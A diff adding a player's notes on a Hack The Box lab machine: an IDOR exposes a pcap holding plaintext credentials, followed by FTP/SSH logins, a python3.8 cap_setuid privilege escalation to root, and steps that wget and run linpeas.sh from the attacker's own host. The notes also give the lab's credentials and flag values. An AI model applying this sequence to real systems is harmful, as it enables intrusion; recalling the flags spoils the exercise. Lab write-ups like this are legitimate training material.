@@ -1,0 +1,99 @@
+Completed: https://www.hackthebox.com/achievement/machine/2176456/351
+IDOR in web page /0
+download pcap
+
+User: nathan
+Pass: Buck3tH4TF0RM3!
+
+FTP:
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# ftp nathan@10.10.10.245                                                                                                                                            
+  Connected to 10.10.10.245.
+  220 (vsFTPd 3.0.3)
+  331 Please specify the password.
+  Password: 
+  230 Login successful.
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+ftp> ls
+  229 Entering Extended Passive Mode (|||22414|)
+  150 Here comes the directory listing.
+  -r--------    1 1001     1001           33 May 04 12:40 user.txt
+  226 Directory send OK.
+ftp> get user.txt
+  local: user.txt remote: user.txt
+  229 Entering Extended Passive Mode (|||25451|)
+  150 Opening BINARY mode data connection for user.txt (33 bytes).
+  100% |**************************************************************************************************************************|    33       20.14 KiB/s    00:00 ETA
+  226 Transfer complete.
+  33 bytes received in 00:00 (0.28 KiB/s)
+ftp> exit
+  221 Goodbye.
+
+SSH:
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# ssh nathan@10.10.10.245
+  The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
+  ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
+  This key is not known by any other names.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes            
+  Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
+  nathan@10.10.10.245's password: 
+  lWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+  
+   * Documentation:  https://help.ubuntu.com
+   * Management:     https://landscape.canonical.com
+   * Support:        https://ubuntu.com/advantage
+  
+    System information as of Sun May  4 15:27:58 UTC 2025
+  
+    System load:  0.06              Processes:             235
+    Usage of /:   36.7% of 8.73GB   Users logged in:       1
+    Memory usage: 33%               IPv4 address for eth0: 10.10.10.245
+    Swap usage:   0%
+  
+    => There are 3 zombie processes.
+  
+  
+  63 updates can be applied immediately.
+  42 of these updates are standard security updates.
+  To see these additional updates run: apt list --upgradable
+  
+  
+  The list of available updates is more than a week old.
+  To check for new updates run: sudo apt update
+  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+  Last login: Sun May  4 15:27:31 2025 from 10.10.15.3
+nathan@cap:~$ ls
+  user.txt
+nathan@cap:~$ cat user.txt 
+  b0b5823e9987720ca9d15b2be6dc4f0d
+nathan@cap:~$ id
+  uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+nathan@cap:/var/www/html$ ls -l /usr/bin/python3
+  lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -> python3.8
+nathan@cap:/var/www/html$ getcap -r / 2>/dev/null 
+  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+  /usr/bin/ping = cap_net_raw+ep
+  /usr/bin/traceroute6.iputils = cap_net_raw+ep
+  /usr/bin/mtr-packet = cap_net_raw+ep
+  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+root@cap:/var/www/html# whoami
+  root
+root@cap:/var/www/html# id
+  uid=0(root) gid=1001(nathan) groups=1001(nathan)
+root@cap:/var/www/html# cd /root/
+root@cap:/root# cat root.txt 
+  e9c8a9a53737f4d6c5b9e6e8c9b505be
+
+
+linpeas.sh
+python -m http.server 80
+
+
+cd /temp
+wget http://"OWNIP"/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
